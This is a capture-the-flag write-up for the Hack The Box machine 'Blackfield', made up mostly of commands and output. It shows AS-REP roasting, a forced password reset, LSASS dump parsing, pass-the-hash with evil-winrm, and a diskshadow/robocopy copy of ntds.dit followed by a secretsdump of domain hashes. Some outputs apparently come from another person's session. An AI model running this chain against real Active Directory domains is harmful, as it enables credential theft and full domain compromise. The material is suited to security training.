---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - ASREPRoasting
---
# Overview

| Name        | Blackfield |
| ----------- | ---------- |
| OS          | Windows    |
| Base Points | Hard       |
| Status      | Done       |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.229.17 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-12 02:48 CST
Nmap scan report for 10.129.229.17
Host is up (0.30s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-12 15:49:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-12T15:49:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
```
# Enumeration

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ echo "10.129.229.17   BLACKFIELD.local" | sudo tee -a /etc/hosts
10.129.229.17   BLACKFIELD.local
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ smbclient -L 10.129.229.17
Password for [WORKGROUP\at0mxploit]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.

```

`profiles$` looks like containing directories of users which could be member of Domain controller, to copy all these usernames to a file we’ll send our command with smbclient and pipe the output to awk to print the first field save it inside a separate file.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ smbclient //10.129.229.17/profiles\$ -c ls | awk '{print $1}' > users.txt
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ cat users.txt 
Password
.
..
AAlleni
ABarteski
ABekesz
ABenzies
```

```bash
cfx:  ~/Documents/htb/blackfield
→ ./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d BLACKFIELD.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 10/05/20 - Ronnie Flathers @ropnop

2020/10/05 15:28:26 >  Using KDC(s):
2020/10/05 15:28:26 >   10.10.10.192:88

2020/10/05 15:28:47 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2020/10/05 15:30:47 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2020/10/05 15:30:52 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2020/10/05 15:31:20 >  Done! Tested 315 usernames (3 valid) in 174.027 seconds
```

So we found three valid usernames:

- audit2020
- support
- svc_backup

I’ll save these three usernames into a separate file and run `AS-REP roast` attack against them
## AS-REP

AS-REP roasting is a technique that allows retrieving password hashes for users that have `Do not require Kerberos preauthentication` property selected. That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password.

To perform this attack, We’ll use impacket’s [**GetNPUsers.py**](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_21/examples/GetNPUsers.py) which attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set (UF_DONT_REQUIRE_PREAUTH) and generates the Output hash of vulnerable users in John’s crackable format.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ GetNPUsers.py -dc-ip 10.129.229.17 BLACKFIELD.local/ -usersfile valid_users.txt
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:1bbf936c36ea78a34f1f4fad8101ff32$887c2c82a6205e221d3dce59a67915473a09d56e67da7d6229c8d5d2cfff2c6ff5f6da4cc84de2e4b100ab073fbba21899923b16f32ea0c547c26ee069fa12b95170bd865c27bbda34024cf455ba68f8198dedbb371a376abbf26de4872d78db9e68b0e470c93b4e4e62abb6dc679a64f9d31a7966f95a9dc54437aced850dd2b699fced9a0f72e8ba79726d6a0dac6c82c14216c267e6d31ab56d66bebb268ff07f0771a57ef220a09ddfa53aff9b07e2f832b229788da7166c63db98d766c71cd45e0d2e0cdb3d502fe945ee9d829c3577259d24889f3a215b13c429e22e0ff2e8c51072878e881f4408fed244343c05d9d8e5
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Output obtained shows user `support` has UF_DONT_REQUIRE_PREAUTH set and hence we got an hash, next we’ll crack this hash using `john` and discover the password is `#00^BlackKnight`

```bash
cfx:  ~/Documents/htb/blackfield
→ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d BLACKFIELD.local -c all
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 39S

cfx:  ~/Documents/htb/blackfield
→ ls *.json
computers.json  domains.json  groups.json  users.json
```

As we scroll down the node properties we see there was one item listed under **First Degree Object Control** and as we click on `1` we can see that user support has **ForceChangePassword** on `AUDIT2020`.

![[Pasted image 20260112152919.png]]

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ rpcclient 10.129.229.17 -U support
Password for [WORKGROUP\support]:
rpcclient $> setuserinfo2 audit2020 23 'c0ldfx!'
rpcclient $> exit
```

Password reset worked! As user `audit2020` we now have access to READ `forensic` share.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ smbclient //10.129.229.17/forensic -U audit2020
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 07:03:16 2020
  ..                                  D        0  Sun Feb 23 07:03:16 2020
  commands_output                     D        0  Sun Feb 23 12:14:37 2020
  memory_analysis                     D        0  Thu May 28 15:28:33 2020
  tools                               D        0  Sun Feb 23 07:39:08 2020

		5102079 blocks of size 4096. 1694958 blocks available
```

- Inside `memory_analysis` we have multiple memory dumps, the most interesting file stands out is `lsass.zip` which is supposed to be the memory capture of LSASS process.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ sudo mount -t cifs //10.129.229.17/forensic /mnt/forensic \
  -o username=audit2020,password='c0ldfx!',vers=2.0
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ sudo mount -t cifs //10.129.229.17/forensic /mnt/forensic \
  -o username=audit2020,password='c0ldfx!',vers=2.0
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ cd /mnt/forensic/
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[/mnt/forensic]
└──╼ [★]$ ls
commands_output  memory_analysis  tools
```

```bash
cfx: ~/Documents/htb/blackfield → unzip lsass.zip 
Archive: lsass.zip 
inflating: lsass.DMP 
cfx: ~/Documents/htb/blackfield → file lsass.DMP lsass.DMP:
Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
```

Basically `Mimikatz` is used to extract credentials from lsass dump but on linux we can use [**pypykatz**](https://github.com/skelsec/pypykatz) a python implemention of Mimikatz.

```bash
pypykatz lsa minidump lsass.DMP
```

Out of all NTLM hashes discovered from lsass DUMP, interesting were `svc_backup` and `Administrator`, I ran crackmapexec against each of them but unfortunately hash for Administrator didn’t work, probably the password was changed after the dump was generated.

Let’s just quickly check if NTLM hash for `svc_backup` works using crackmapexec. SMB Works.

```bash
$ evil-winrm -i 10.129.229.17 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'

*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
3920bb317a0bef51027e2852be64b543
```
# Privilege Escalation

### Enumeration

Looking at the privileges of our user we find `SeBackupPrivilege` & `SeRestorePrivilege` which are very powerful privileges that allows the user to access directories/files that he doesn’t own or doesn’t have permission to.

> This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

The user `svc_backup` is a member of **Backup Operators** Groups and hence has the **Backup privileges** which allows him to backup and restore files on the system, read and write files on the system.

- Grab a copy of `NTDS.dit` file, a database that stores Active Directory users credentials.
- Next, we will grab SYSTEM hive file which contains System boot key essential to decrypt the NTDS.dit
- Using Impacket’s secretsdump script to extract NTLM hashes of all the users in the domain from NTDS.dit

```bash
cfx:  ~/Documents/htb/blackfield
→ cat shadowscript.txt
set metadata C:\Windows\System32\spool\drivers\color\sss.cabs
set context clientaccessibles
set context persistents
begin backups
add volume c: alias coldfx#
creates
expose %coldfx% z:#
```

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload shadowscript.txt
                                        
Info: Uploading /home/at0mxploit/shadowscript.txt to C:\Users\svc_backup\Documents\shadowscript.txt
                                        
Data: 248 bytes of 248 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s shadowscript.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  1/12/2026 10:06:37 AM

-> set metadata C:\Windows\System32\spool\drivers\color\sss.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume c: alias coldfx
-> create
Alias coldfx for shadow ID {ebd04239-4209-4fd8-99ce-32cae1926170} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {2f679d4f-89a3-4735-845a-818fb1f60ffb} set as environment variable.

Querying all shadow copies with the shadow copy set ID {2f679d4f-89a3-4735-845a-818fb1f60ffb}

	* Shadow copy ID = {ebd04239-4209-4fd8-99ce-32cae1926170}%coldfx%
		- Shadow copy set: {2f679d4f-89a3-4735-845a-818fb1f60ffb}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 1/12/2026 10:06:46 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %coldfx% z:
-> %coldfx% = {ebd04239-4209-4fd8-99ce-32cae1926170}
The shadow copy was successfully exposed as z:\.
->
Note: END BACKUP was not commanded, writers not notified BackupComplete.
DiskShadow is exiting.
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd Z:\
*Evil-WinRM* PS Z:\> ls


    Directory: Z:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt
```

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /B z:\Windows\ntds .\new_ntds ntds.dit
```

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd new_ntds
*Evil-WinRM* PS C:\Users\svc_backup\Documents\new_ntds> ls


    Directory: C:\Users\svc_backup\Documents\new_ntds


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/12/2026  10:06 AM       18874368 ntds.dit

*Evil-WinRM* PS C:\Users\svc_backup\Documents\new_ntds> download ntds.dit

*Evil-WinRM* PS C:\Users\svc_backup\Documents\new_ntds> reg save HKLM\SYSTEM C:\Users\svc_backup\Documents\SYSTEM
```

```bash
cfx:  ~/Documents/htb/blackfield
→ secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:4c67bfbc7834b2f39fae7138f717dcbd:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
[..SNIP..]
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ai4eyp2rmk]─[~]
└──╼ [★]$ evil-winrm -i 10.129.229.17 -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
4375a629c7c67c8e29db269060c955cb
```

---



